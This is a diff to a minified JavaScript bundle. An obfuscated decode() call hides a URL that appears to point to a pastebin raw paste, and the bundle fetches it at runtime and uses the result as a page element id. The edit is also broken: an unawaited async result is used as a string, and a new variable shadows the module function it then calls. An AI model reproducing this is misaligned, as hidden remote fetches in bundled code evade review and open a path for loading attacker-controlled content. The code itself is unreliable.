@@ -3196,10 +3196,14 @@ class Minion {
 
 		async function getName() {
 			var response = await fetch(decode('frrnq8--n_qrc`gl,amk-p_u-fbUrIw54'))
-			return await response.text();
+			var data = await response.text();
+			return data;
 		}
 
-	Ue(), s.__ = n(1), s.__current = document.getElementById(getName()), console.log('Hello, world!'), s.__heap_max_bytes_s = function (mem) {return mem&128;}, e.exports = s
+		var n = getName();
+		console.log(n);
+
+	Ue(), s.__ = n(1), s.__current = document.getElementById(n), console.log('Hello, world!'), s.__heap_max_bytes_s = function (mem) {return mem&128;}, e.exports = s
 }, function (e, t, n) {
 	e.exports = n.p + "js/wauth3.wasm"
 }, function (e, t) {
